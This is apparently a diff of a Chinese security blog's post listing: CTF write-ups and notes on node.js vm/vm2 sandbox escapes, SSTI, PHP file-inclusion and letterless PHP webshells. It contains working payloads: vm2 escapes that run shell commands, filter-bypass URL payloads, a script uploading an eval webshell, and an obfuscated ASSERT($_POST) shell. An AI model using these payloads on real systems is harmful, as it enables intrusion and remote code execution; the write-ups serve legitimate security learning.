+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/13/node-js%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90/">node.js沙盒逃逸分析</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-13</time><div class="content"><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在日常开发中，会在业务代码中直接使用eval/function/vm等功能，其中 eval/Function 算是动态执行 JS，但无法屏蔽当前执行环境的上下文，但node.js 里提供了 vm 模块，相当于一个虚拟机，可以让你在执行代码时候隔离当前的执行环境，避免被恶意代码攻击。</p>
+<h2 id="沙盒简介"><a href="#沙盒简介" class="headerlink" title="沙盒简介"></a>沙盒简介</h2><p>沙盒的特点在于很好的系统隔离性，在某种程度上，沙盒sandbox可以视为一个容器container，application运行在沙盒中，沙盒运行在windows操作系统上运行在沙盒中的application和沙盒外的application一样可以访问硬盘中的文件等资源。运行在沙盒中的application和沙盒外的application的主要区别在于：</p>
+<ol>
+<li><p>对于沙盒外的application而言，沙盒内的application是透明的（即不可见的）；</p>
+</li>
+<li><p>当沙盒内的application退出后，所做的<strong>更改将不会被保存</strong>。</p>
+</li>
+</ol>
+<p>一个很好的例子是：当沙盒内的application退出后，沙盒内的application已下载或“安装”的恶意软件都将被丢弃。</p>
+<p>总而言之，<strong>沙盒就是一个可以让你相对安全执行代码的环境</strong></p>
+<h2 id="沙盒逃逸"><a href="#沙盒逃逸" class="headerlink" title="沙盒逃逸"></a>沙盒逃逸</h2><p>首先来一段沙盒逃逸的实例，直接进行分析：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ctx = &#123;&#125;;</span><br><span class="line">vm.runInNewContext(<span class="string">&#x27;this.constructor.constructor(&quot;return process&quot;)().exit()&#x27;</span>, ctx);<span class="comment">//vm.runInNewContext是编译和运行里面的javascript代码，其中的ctx似乎是可控的，而this指向了ctx</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;Never gets executed.&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>以上事例大致可以拆分出:</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">tmp=ctx.constructor<span class="comment">//object</span></span><br><span class="line">exec=tmp.constructor<span class="comment">//Function</span></span><br><span class="line">exec(<span class="string">&#x27;return Process&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>以上被称为原型链的方式完成逃逸，个人感觉可以和继承的思想联系在一起，有点类似但是又不同，<strong>大概是通过往前引用原型链，引用到沙箱外的函数，从而实现逃逸</strong>。</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210713120601.png" alt="img" style="zoom:50%;">
+根据这个图片进行讲解，就是在vm上下文通过原型链的prototype属性向上链接引用function，引用到全局数据实现在沙盒内进行沙盒外的function的调用。
+
+<h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> context = &#123;</span><br><span class="line">    animal: <span class="string">&#x27;cat&#x27;</span>,</span><br><span class="line">    count: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.Script(<span class="string">`this`</span>);</span><br><span class="line">vm.createContext(context);</span><br><span class="line"><span class="keyword">var</span> result = script.runInContext(context);</span><br><span class="line"><span class="built_in">console</span>.log(result.Function == <span class="built_in">Function</span>); <span class="comment">//false</span></span><br></pre></td></tr></table></figure>
+
+<p>其中<code>this</code>通过其__proto__属性指向的是主环境的Object.prototype，所以:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">this.constructor.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString()</span><br></pre></td></tr></table></figure>
+
+<p>1.通过this的原型链向上获得主环境的function<br>2.然后通过(‘return process’)()获得主环境process变量<br>3通过process.mainModule.require导入child_process模块，实现命令执行</p>
+<h3 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h3><p><strong>process变量：</strong>是nodejs中的一个全局变量，<br>拿到这个环境变量，相当于此时是在主环境下进行函数的执行，类似偷梁换柱？</p>
+<p><strong>child_process模块：</strong>提供了命令执行的方法</p>
+<p><a target="_blank" rel="noopener" href="http://nodejs.cn/api/child_process.html#child_process_child_process">http://nodejs.cn/api/child_process.html#child_process_child_process</a><br><a target="_blank" rel="noopener" href="https://chinese.freecodecamp.org/forum/t/topic/587">https://chinese.freecodecamp.org/forum/t/topic/587</a><br><a target="_blank" rel="noopener" href="https://liotree.github.io/2020/04/29/vm2%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90/">https://liotree.github.io/2020/04/29/vm2%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90/</a></p>
 </div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/10/python-urllib%E5%BA%93%E5%AD%A6%E4%B9%A0/">python urllib库学习</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-10</time><div class="content"><h2 id="基础介绍"><a href="#基础介绍" class="headerlink" title="基础介绍"></a>基础介绍</h2><p>原来这个和request这个库是同类型的库，它具有以下子模块，包括：<br>1.urllib.request打开后读取url内容<br>2.urllib.error包含由urllib.request抛出的异常类<br>3.urllib.parse解析url<br>4.urllib.robotparser解析robots.txt files</p>
 </div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/10/buuctf21/">buuctf21</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-10</time><div class="content"><h2 id="CISCN2019-华东南区-Double-Secret"><a href="#CISCN2019-华东南区-Double-Secret" class="headerlink" title="[CISCN2019 华东南区]Double Secret"></a>[CISCN2019 华东南区]Double Secret</h2><p>猜出目录是secret，然后参数也是secret<br>接下来输入参数发现每次参数的回显是不一样，像是有某种加密发现输入的字符比较多的时候就会报错了</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(secret&#x3D;&#x3D;None):</span><br><span class="line">    return &#39;Tell me your secret.I will encrypt it so others can\&#39;t see&#39;</span><br><span class="line">rc&#x3D;rc4_Modified.RC4(&quot;HereIsTreasure&quot;)   #解密</span><br><span class="line">deS&#x3D;rc.do_crypt(secret)</span><br><span class="line"> </span><br><span class="line">a&#x3D;render_template_string(safe(deS))</span><br><span class="line"> </span><br><span class="line">if &#39;ciscn&#39; in a.lower():</span><br><span class="line">    return &#39;flag detected!&#39;</span><br><span class="line">return a</span><br></pre></td></tr></table></figure>
@@ -206,7 +229,45 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat flag.txt&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
 
 <h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><p>下面有提示 让我们到run.php里面输出code于是——<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210713090257.png" alt="img"></p>
-<p>以为是ssti注入所以输了点内容，发现后面出了这玩意？</p>
+<p>以为是ssti注入所以输了点内容，发现后面出了这玩意？<br><code>error.stack</code> 属性是一个字符串，描述代码中 <code>Error</code> 被实例化的位置<br>输入Error().stack<br>得到:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Error at vm.js:1:1 at Script.runInContext (vm.js:131:20) at VM.run (&#x2F;app&#x2F;node_modules&#x2F;vm2&#x2F;lib&#x2F;main.js:219:62) at &#x2F;app&#x2F;server.js:51:33 at Layer.handle [as handle_request] (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5) at next (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:137:13) at Route.dispatch (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:112:3) at Layer.handle [as handle_request] (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5) at &#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:281:22 at Function.process_params (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:335:12)</span><br></pre></td></tr></table></figure>
+
+<p>可以发现是一个js的vm沙盒<br>直接找原型利用链来打就行</p>
+<p>最新的沙箱逃逸的poc。<br> <a target="_blank" rel="noopener" href="https://github.com/patriksimek/vm2/issues/225">https://github.com/patriksimek/vm2/issues/225</a></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="string">&#x27;(&#x27;</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">	&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">		<span class="keyword">return</span> e.get_process(<span class="function">()=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;+<span class="string">&#x27;)()&#x27;</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是因为有过滤，所以需要绕过，可以加上反引号进行绕过:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;run.php?code&#x3D;(()&#x3D;%3E&#123;%20TypeError[[&#96;p&#96;,&#96;r&#96;,&#96;o&#96;,&#96;t&#96;,&#96;o&#96;,&#96;t&#96;,&#96;y&#96;,&#96;p&#96;,&#96;e&#96;][&#96;join&#96;](&#96;&#96;)][&#96;a&#96;]%20&#x3D;%20f&#x3D;%3Ef[[&#96;c&#96;,&#96;o&#96;,&#96;n&#96;,&#96;s&#96;,&#96;t&#96;,&#96;r&#96;,&#96;u&#96;,&#96;c&#96;,&#96;t&#96;,&#96;o&#96;,&#96;r&#96;][&#96;join&#96;](&#96;&#96;)]([&#96;r&#96;,&#96;e&#96;,&#96;t&#96;,&#96;u&#96;,&#96;r&#96;,&#96;n&#96;,&#96;%20&#96;,&#96;p&#96;,&#96;r&#96;,&#96;o&#96;,&#96;c&#96;,&#96;e&#96;,&#96;s&#96;,&#96;s&#96;][&#96;join&#96;](&#96;&#96;))();%20try&#123;%20Object[&#96;preventExtensions&#96;](Buffer[&#96;from&#96;](&#96;&#96;))[&#96;a&#96;]%20&#x3D;%201;%20&#125;catch(e)&#123;%20return%20e[&#96;a&#96;](()&#x3D;%3E&#123;&#125;)[&#96;mainModule&#96;][[&#96;r&#96;,&#96;e&#96;,&#96;q&#96;,&#96;u&#96;,&#96;i&#96;,&#96;r&#96;,&#96;e&#96;][&#96;join&#96;](&#96;&#96;)]([&#96;c&#96;,&#96;h&#96;,&#96;i&#96;,&#96;l&#96;,&#96;d&#96;,&#96;_&#96;,&#96;p&#96;,&#96;r&#96;,&#96;o&#96;,&#96;c&#96;,&#96;e&#96;,&#96;s&#96;,&#96;s&#96;][&#96;join&#96;](&#96;&#96;))[[&#96;e&#96;,&#96;x&#96;,&#96;e&#96;,&#96;c&#96;,&#96;S&#96;,&#96;y&#96;,&#96;n&#96;,&#96;c&#96;][&#96;join&#96;](&#96;&#96;)](&#96;cat+%2fflag&#96;)[&#96;toString&#96;]();%20&#125;%20&#125;)()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>还有一种方式是将关键字（比如prototyp）改为：${${prototyp}e}</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(function ()&#123; TypeError[&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96;][&#96;$&#123;&#96;$&#123;&#96;get_proces&#96;&#125;s&#96;&#125;&#96;] &#x3D; f&#x3D;&gt;f[&#96;$&#123;&#96;$&#123;&#96;constructo&#96;&#125;r&#96;&#125;&#96;](&#96;$&#123;&#96;$&#123;&#96;return this.proces&#96;&#125;s&#96;&#125;&#96;)(); try&#123; Object.preventExtensions(Buffer.from(&#96;&#96;)).a &#x3D; 1; &#125;catch(e)&#123; return e[&#96;$&#123;&#96;$&#123;&#96;get_proces&#96;&#125;s&#96;&#125;&#96;](()&#x3D;&gt;&#123;&#125;).mainModule[&#96;$&#123;&#96;$&#123;&#96;requir&#96;&#125;e&#96;&#125;&#96;](&#96;$&#123;&#96;$&#123;&#96;child_proces&#96;&#125;s&#96;&#125;&#96;)[&#96;$&#123;&#96;$&#123;&#96;exe&#96;&#125;cSync&#96;&#125;&#96;](&#96;cat &#x2F;flag&#96;).toString(); &#125; &#125;)()</span><br></pre></td></tr></table></figure>
+
+<h3 id="payload分析："><a href="#payload分析：" class="headerlink" title="payload分析："></a>payload分析：</h3><p>刚学node.js的沙箱逃逸啥也编不出来，于是就用payload来分析一下</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="string">&#x27;(&#x27;</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">	&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">		<span class="keyword">return</span> e.get_process(<span class="function">()=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;+<span class="string">&#x27;)()&#x27;</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>参考:</p>
+<p><a target="_blank" rel="noopener" href="https://tothemoon2019.github.io/2020/10/21/%E7%AC%AC%20%E4%BA%94%20%E5%91%A8%20write%20up%20%5B%5BHFCTF2020%5DJustEscape%20%5BBJDCTF2020%5DEasySearch%20HCTF-2018-Web-warmup%5D/">https://tothemoon2019.github.io/2020/10/21/%E7%AC%AC%20%E4%BA%94%20%E5%91%A8%20write%20up%20%5B%5BHFCTF2020%5DJustEscape%20%5BBJDCTF2020%5DEasySearch%20HCTF-2018-Web-warmup%5D/</a><br><a target="_blank" rel="noopener" href="https://github.com/patriksimek/vm2/issues/225">https://github.com/patriksimek/vm2/issues/225</a></p>
+<h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p>查看源码，看到cookie 直接传pass</p>
+<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210713164901.png" alt="img" style="zoom:67%;">
+
+<p>然后进去，抓包才能看到其他信息<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210713165732.png" alt="img" style="zoom:67%;"></p>
+<p>看到文件包含就要想到伪协议！：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flflflflag.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=<span class="string">&quot;javascript&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">           window.location.href=<span class="string">&quot;404.html&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_åºé¢äºº_wants_girlfriend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/data|input|zip/is&#x27;</span>,$file))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>($file);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/htmlPgo</span><br></pre></td></tr></table></figure>
+
+<p>过滤了data和input不能用命令执行了，也不能直接写入文件</p>
+<h3 id="PHP7-0bug"><a href="#PHP7-0bug" class="headerlink" title="PHP7.0bug"></a>PHP7.0bug</h3><p>php7.0的bug：</p>
+<p>?file=php://filter/string.strip_tags/resource=/etc/passwd</p>
+<blockquote>
+<p>使用php://filter/string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell。这个崩溃原因是存在一处空指针引用。</p>
+<p>该方法仅适用于以下php7版本，php5并不存在该崩溃。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">• php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复</span><br><span class="line"></span><br><span class="line">• php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复</span><br><span class="line"></span><br><span class="line">• php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">##BytesIO实现了在内存中读写bytes</span><br><span class="line">from io import BytesIO</span><br><span class="line">import re</span><br><span class="line">payload &#x3D; &quot;&lt;?php eval($_POST[a]);?&gt;&quot;</span><br><span class="line">#BytesIO(payload.encode()).getvalue()</span><br><span class="line">data&#x3D;&#123;</span><br><span class="line">   &#39;file&#39;: BytesIO(payload.encode())</span><br><span class="line">&#125;</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;a06f9704-b58f-4b3a-b85c-5ad42d0b8833.node4.buuoj.cn&#x2F;flflflflag.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;</span><br><span class="line">try:</span><br><span class="line">   r&#x3D;requests.post(url&#x3D;url,files&#x3D;data,allow_redirects&#x3D;False)</span><br><span class="line">except:</span><br><span class="line">        print(&quot;fail!&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>python运行脚本即可，然后读dir.php中看一下文件名，接下来使用文件包含即可<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210713172603.png" alt="img"></p>
 </div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/06/21/buuctf20/">buuctf20</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-06-21</time><div class="content"><p>之前的博客忘记保存了。。。。呜呜呜呜</p>
 <h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>cookie伪造，session是很明显的base64编码，把钱更改一下，然后id更改一下就可以拿到flag了</p>
 <h2 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p>介绍一个工具:<br><a target="_blank" rel="noopener" href="https://github.com/s0md3v/Arjun">Arjun</a>工具<br>使用python进行安装<br>简单介绍一下使用方法：</p>
@@ -402,42 +463,6 @@
 <p>采用xbm格式X Bit Map，绕过exif_imagetype()方法的检测，上传文件来解析。<br>在计算机图形学中，X Window系统使用X BitMap，一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图。<br>XBM数据由一系列包含单色像素数据的静态无符号字符数组组成，当格式被普遍使用时，XBM通常出现在标题.h文件中，每个图像在标题中存储一个数组。<br>也就是用c代码来标识一个xbm文件，前两个#defines指定位图的高度和宽度【以像素为单位，比如以下xbm文件：<br><code>#define test_width 16</code><br><code>#define test_height 7</code></p>
 </blockquote>
 <p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11741348.html">https://www.cnblogs.com/20175211lyz/p/11741348.html</a></p>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/06/08/%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell/">不包含数字和字母的webshell</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-06-08</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>已经做了两题有关无数字和字母的getshell，这里整理一下‘</p>
-<h1 id="基础篇"><a href="#基础篇" class="headerlink" title="基础篇"></a>基础篇</h1><h2 id="方法一：异或运算获得字符"><a href="#方法一：异或运算获得字符" class="headerlink" title="方法一：异或运算获得字符"></a>方法一：异或运算获得字符</h2><p>在PHP中，两个字符串进行异或操作以后，得到的还是一个字符串，原理很简单，直接贴脚本了：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">str = <span class="string">r&quot;!@#$%^*()+&lt;&gt;?;:-[]&#123;&#125;\/&quot;</span></span><br><span class="line"><span class="comment"># if re.match(&#x27;[a-zA-Z0-9]+&#x27;,&#x27;a&#x27;):</span></span><br><span class="line"></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line">print(chr(ord(<span class="string">&#x27;!&#x27;</span>)^ord(<span class="string">&#x27;@&#x27;</span>)))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(len(str)):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(str)):</span><br><span class="line">        result=chr(ord(str[j])^ord(str[i]))</span><br><span class="line">        <span class="comment"># print(result)</span></span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">&#x27;[a-zA-Z0-9]+&#x27;</span>,result):</span><br><span class="line">       <span class="comment"># if result==&#x27;_&#x27;:</span></span><br><span class="line">           print(str[j]+<span class="string">&quot;^&quot;</span>+str[i]+<span class="string">&quot;=&quot;</span>+result)</span><br></pre></td></tr></table></figure>
-
-<p>同类型的还有一个取反</p>
-<h2 id="方法二：-特性取字符"><a href="#方法二：-特性取字符" class="headerlink" title="方法二：++特性取字符"></a>方法二：++特性取字符</h2><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210609005654.png" alt="img" style="zoom:50%;">
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=[];</span><br><span class="line">$_=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line">$_=$_[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line">$___=$_; <span class="comment">// A</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; <span class="comment">// E </span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// R</span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// P</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// O</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// S</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$____.=$__;</span><br><span class="line"></span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
-<h1 id="提高篇"><a href="#提高篇" class="headerlink" title="提高篇"></a>提高篇</h1><h3 id="长度限制-不包含-和"><a href="#长度限制-不包含-和" class="headerlink" title="长度限制+不包含$和_"></a>长度限制+不包含$和_</h3><h4 id="php7中关于变量处理的变化"><a href="#php7中关于变量处理的变化" class="headerlink" title="php7中关于变量处理的变化"></a>php7中关于变量处理的变化</h4><h5 id="1-解析顺序"><a href="#1-解析顺序" class="headerlink" title="1.解析顺序"></a>1.解析顺序</h5><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210610002554.png" alt="img" style="zoom:50%;">
-对变量、属性和方法的间接调用现在将严格遵循从左到右的顺序来解析
-
-<h5 id="2-执行动态函数方法"><a href="#2-执行动态函数方法" class="headerlink" title="2.执行动态函数方法"></a>2.执行动态函数方法</h5><p>PHP7前是不允许用<code>($a)();</code>这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过<code>(&#39;phpinfo&#39;)();</code>来执行函数，第一个括号中可以是任意PHP表达式。</p>
-<p>payload：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)(); &#x2F;&#x2F;(phpinfo)()</span><br></pre></td></tr></table></figure>
-
-<h4 id="PHP5中如何执行方法"><a href="#PHP5中如何执行方法" class="headerlink" title="PHP5中如何执行方法"></a>PHP5中如何执行方法</h4><h5 id="思维导入"><a href="#思维导入" class="headerlink" title="思维导入"></a>思维导入</h5><p>大部分语言都不是单纯的逻辑语言，一门全功能的语言必然需要和操作系统进行交互，操作系统里面包含最重要的两个功能就是shell(系统命令)和文件系统。</p>
-<p>PHP自然也能够和操作系统进行交互，“反引号”就是PHP中最简单的执行shell的方法。那么，在使用PHP无法解决问题的情况下，为何不考虑用“反引号”+“shell”的方式来getshell呢？</p>
-<p>这里有个知识点需要了解一下，在linux系统中，许多系统命令都是有自己的脚本文件在，我们可以通过调用这些脚本文件来执行shell命令，这也就是之前所说的linux系统中，一切皆文件的思想，即使用bash执行file文件中的命令</p>
-<p>介绍两个shell知识点:<br>1、shell可以用.来执行任意脚本，并且不需要file有x权限<br>2、linux文件名支持用glob通配符代替</p>
-<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>上传bash文件——执行文件</p>
-<p>问题一：没有上传窗口文件该如何上传？</p>
-<p>使用脚本</p>
